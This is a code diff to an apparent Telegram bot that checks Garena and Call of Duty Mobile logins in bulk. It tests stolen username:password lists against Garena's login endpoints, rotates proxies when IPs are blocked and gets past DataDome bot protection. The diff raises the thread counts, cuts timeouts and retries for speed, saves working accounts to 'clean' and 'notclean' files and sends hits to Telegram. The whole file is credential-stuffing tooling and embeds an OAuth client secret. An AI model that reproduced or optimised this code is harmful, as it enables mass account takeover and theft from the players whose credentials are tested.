@@ -78,31 +78,26 @@ _proxy_msg_ids: dict = {}       # chat_id -> [msg_id, ...]
 _deletekey_selection: dict = {}  # chat_id -> set of key strings
 
 # ══════════════════════════════════════════════════════════════
-#  GLOBAL RESOURCE CONTROLS
-#  Tuned for: 8GB RAM VPS, 83% RAM at idle (~1.35GB free)
+#  GLOBAL RESOURCE CONTROLS  — tuned for Railway
 #
-#  RAM math per checker thread:
-#    • cloudscraper session  ~12MB
-#    • requests + TLS stack   ~8MB
-#    • Python overhead        ~5MB
-#    • ≈ 25MB per thread (safe estimate)
+#  RAM per thread (lean sessions: pool_connections=3, pool_maxsize=5):
+#    • cloudscraper session  ~5MB
+#    • requests + TLS stack  ~3MB
+#    • Python overhead       ~2MB
+#    • ≈ 10MB per thread
 #
-#  Free RAM:  ~1350MB
-#  Reserve for OS + bot overhead: 400MB
-#  Usable for threads: ~950MB
-#  Max safe threads: 950 / 25 ≈ 38 → cap at 4 (conservative, stable)
-#
-#  CPU is only 21.8% so CPU is NOT the bottleneck — RAM is.
+#  50 threads × 10MB = ~500MB  →  safe on Railway's 512MB–8GB plans
+#  Memory watchdog auto-throttles if RAM spikes.
 # ══════════════════════════════════════════════════════════════
 
 # Hard cap on total checker threads across ALL users at once
-MAX_GLOBAL_THREADS   = 30     # increased for Railway — handles more concurrent work
+MAX_GLOBAL_THREADS   = 50     # Railway can handle 50 with lean sessions (~10MB each)
 # Threads per individual user (limits one user hogging everything)
-MAX_THREADS_PER_USER = 8      # 8 threads per user — faster checking
+MAX_THREADS_PER_USER = 10     # 10 threads per user — fast checking
 # Max users running the checker simultaneously
 MAX_CONCURRENT_USERS = 10     # 10 users supported concurrently
 # VIP users get higher thread count for faster checking
-VIP_THREADS_PER_USER = 5      # VIP users: 5 threads
+VIP_THREADS_PER_USER = 10     # VIP users: 10 threads
 
 # Global semaphore — enforces MAX_GLOBAL_THREADS hard cap
 _global_thread_sem = threading.Semaphore(MAX_GLOBAL_THREADS)
@@ -1212,7 +1207,7 @@ def get_datadome_cookie(session):
     try:
         # Use session (which has the thread's proxy set) instead of bare requests
         # This ensures datadome is fetched through the same proxy as the thread
-        response = session.post(url, headers=headers, data=data, timeout=6)
+        response = session.post(url, headers=headers, data=data, timeout=5)
         response.raise_for_status()
         response_json = response.json()
         
@@ -1243,7 +1238,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         'id': str(int(time.time() * 1000))
     }
     
-    retries = 3  # 3 retries for better accuracy
+    retries = 2  # 2 fast retries (IP_BLOCK outer loop handles proxy rotation)
     for attempt in range(retries):
         try:
             current_cookies = session.cookies.get_dict()
@@ -1277,7 +1272,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             if attempt > 0:
                 logger.info(f"      🔄 Retry {attempt + 1}/{retries}")
             
-            response = session.get(url, headers=headers, params=params, timeout=6)
+            response = session.get(url, headers=headers, params=params, timeout=5)
             
             new_cookies = {}
             
@@ -1444,10 +1439,10 @@ def login(session, account, password, v1, v2):
     if cookie_header:
         headers['cookie'] = cookie_header
     
-    retries = 3  # 3 retries for better accuracy on login
+    retries = 2  # 2 fast retries on login
     for attempt in range(retries):
         try:
-            response = session.get(url, headers=headers, params=params, timeout=6)
+            response = session.get(url, headers=headers, params=params, timeout=5)
             response.raise_for_status()
             
             login_cookies = {}
@@ -1549,7 +1544,7 @@ def get_codm_access_token(session):
         device_id = f'02-{str(uuid.uuid4())}'
         grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
         
-        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=7)
+        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=5)
         grant_json = grant_response.json()
         auth_code = grant_json.get('code', '')
         
@@ -1567,7 +1562,7 @@ def get_codm_access_token(session):
         
         token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
         
-        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=7)
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=5)
         token_json = token_response.json()
         
         access_token = token_json.get('access_token', '')
@@ -1591,7 +1586,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
             'referer': 'https://auth.garena.com/'
         }
         
-        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=7)
+        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=5)
         location = old_response.headers.get('Location', '')
         
         if 'err=3' in location:
@@ -1609,7 +1604,7 @@ def process_codm_callback(session, access_token, open_id=None, uid=None):
             'x-requested-with': 'com.garena.game.codm'
         }
         
-        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=7)
+        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=5)
         aos_location = aos_response.headers.get('Location', '')
         
         if 'err=3' in aos_location:
@@ -1658,7 +1653,7 @@ def get_codm_user_info(session, token):
             'x-requested-with': 'com.garena.game.codm'
         }
         
-        response = session.get(url, headers=headers, timeout=7)
+        response = session.get(url, headers=headers, timeout=5)
         data = response.json()
         user_data = data.get('user', {})
         
@@ -1886,23 +1881,10 @@ def save_clean_or_notclean(account, password, details, codm_info, result_folder=
   [] CONFIG BY: @Yukiii_ii
 =======================================
 """
-        # Save to main clean.txt or notclean.txt
-        if is_clean:
-            file_path = os.path.join(result_folder, 'clean.txt')
-        else:
-            file_path = os.path.join(result_folder, 'notclean.txt')
-            
-        account_exists = False
-        identifier = f"  [+] Username       : {username}:{password}"
-        
-        if os.path.exists(file_path):
-            with open(file_path, "r", encoding="utf-8") as f:
-                if identifier in f.read():
-                    account_exists = True
-
-        if not account_exists:
-            with open(file_path, "a", encoding="utf-8") as f:
-                f.write(content_to_save.strip() + "\n\n")
+        # Save to main clean.txt or notclean.txt (append-only, skip full-file scan)
+        file_path = os.path.join(result_folder, 'clean.txt' if is_clean else 'notclean.txt')
+        with open(file_path, "a", encoding="utf-8") as f:
+            f.write(content_to_save.strip() + "\n\n")
 
         # Save to organized CODM folder structure if has CODM
         if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
@@ -2032,7 +2014,7 @@ def parse_account_details(data):
 
 def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', telegram_config=None):
     try:
-        MAX_IP_BLOCK_RETRIES = 3   # 3 fast retries with proxy rotation
+        MAX_IP_BLOCK_RETRIES = 2   # 2 fast retries — don't waste time on dead proxies
         v1, v2, new_datadome = None, None, None
 
         for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
@@ -2083,7 +2065,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         
         # ── account/init with retry on 403 ───────────────────────
         account_data = None
-        for init_attempt in range(4):  # up to 4 tries
+        for init_attempt in range(2):  # 2 fast tries then skip
             current_cookies = session.cookies.get_dict()
             cookie_parts = []
             for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
@@ -2099,10 +2081,10 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if cookie_header:
                 headers['cookie'] = cookie_header
 
-            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=7)
+            response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=5)
 
             if response.status_code == 403:
-                logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/4")
+                logger.warning(f"[INIT] 403 on account/init attempt {init_attempt + 1}/2")
                 if datadome_manager.handle_403(session, telegram_config=telegram_config):
                     logger.info(f"[INIT] Proxy rotated — retrying account/init...")
                     time.sleep(0.01 + init_attempt * 0.01)
@@ -2235,7 +2217,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                             f'━━━━━━━━━━━━━━━━━━━━\n'
                             f'⚡ by @Yukiii_ii'
                         )
-                        send_telegram_message(tg_token, tg_chat, shell_msg)
+                        _send_telegram_async(tg_token, tg_chat, shell_msg)
             return ""
         
         fresh_datadome = datadome_manager.extract_datadome_from_session(session)
@@ -2361,7 +2343,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     f'━━━━━━━━━━━━━━━━━━━━\n'
                     f'⚡ by @Yukiii_ii'
                 )
-                send_telegram_message(tg_token, tg_chat, tg_msg)
+                _send_telegram_async(tg_token, tg_chat, tg_msg)
 
         return ""
 
@@ -2439,17 +2421,28 @@ def save_telegram_config(config: dict):
     with open(TELEGRAM_CONFIG_FILE, "w", encoding="utf-8") as f:
         json.dump(config, f, indent=2)
 
+_tg_hit_session = requests.Session()
+_tg_hit_session.mount("https://", requests.adapters.HTTPAdapter(pool_connections=2, pool_maxsize=4))
+
 def send_telegram_message(bot_token: str, chat_id, message: str, parse_mode: str = "HTML"):
     """Send a Telegram message. Returns message_id on success, None on failure."""
     try:
         url  = f"https://api.telegram.org/bot{bot_token}/sendMessage"
         data = {"chat_id": chat_id, "text": message, "parse_mode": parse_mode}
-        resp = requests.post(url, data=data, timeout=10)
+        resp = _tg_hit_session.post(url, data=data, timeout=5)
         if resp.status_code == 200:
             return resp.json().get("result", {}).get("message_id")
     except Exception:
         pass
     return None
+
+def _send_telegram_async(bot_token: str, chat_id, message: str, parse_mode: str = "HTML"):
+    """Fire-and-forget Telegram message — doesn't block the checker thread."""
+    threading.Thread(
+        target=send_telegram_message,
+        args=(bot_token, chat_id, message, parse_mode),
+        daemon=True,
+    ).start()
 
 def delete_telegram_message(bot_token: str, chat_id, message_id, delay: int = 5):
     """Delete a Telegram message after a delay (seconds)."""
@@ -2634,13 +2627,14 @@ def print_banner():
     print()
 
 def create_thread_session(cookie_manager, datadome_manager):
-    """Create a fast cloudscraper session with keep-alive and pooled connections."""
+    """Create a fast cloudscraper session with keep-alive and lean connection pools.
+    Each thread only talks to ~3 hosts (sso.garena, account.garena, codm.garena)
+    so large pools waste RAM. Keep pools tiny → more threads can run at once."""
     sess = cloudscraper.create_scraper()
-    # ── Optimised adapter: max pooling for speed ────────────────
     adapter = requests.adapters.HTTPAdapter(
-        pool_connections=12,
-        pool_maxsize=30,      # max parallel connections pooled = fewer reconnects
-        max_retries=1,        # one retry for transient failures
+        pool_connections=3,
+        pool_maxsize=5,
+        max_retries=1,
     )
     sess.mount("http://",  adapter)
     sess.mount("https://", adapter)
@@ -3903,6 +3897,8 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
     print_lock       = threading.Lock()
     thread_local     = threading.local()
     thread_init_lock = threading.Lock()
+    _all_sessions    = []          # track every thread session for cleanup
+    _all_sessions_lock = threading.Lock()
 
     # ── Register progress bar entry ────────────────────────────
     bar_key = chat_id or label
@@ -3960,6 +3956,8 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
             thread_local.session = create_thread_session(cookie_manager, dm)
             thread_local.dm      = dm
             thread_local.session.proxies.update(geo_rotator.get_proxies())
+            with _all_sessions_lock:
+                _all_sessions.append(thread_local.session)
         else:
             thread_local.session.proxies.update(geo_rotator.get_proxies())
         return thread_local.session, thread_local.dm
@@ -4026,14 +4024,15 @@ def _run_checker_for_file(filepath: str, telegram_config: tuple, chat_id=None, l
     except Exception:
         pass
 
-    # ── Close all thread sessions to free connections + memory ──
-    if hasattr(thread_local, "session"):
-        try:
-            thread_local.session.close()
-        except Exception:
-            pass
+    # ── Close ALL thread sessions to free connections + memory ──
+    with _all_sessions_lock:
+        for sess in _all_sessions:
+            try:
+                sess.close()
+            except Exception:
+                pass
+        _all_sessions.clear()
 
-    # Force GC to free memory after checker run
     gc.collect()
 
     # ── Remove bar + print done line so terminal stays clean ──
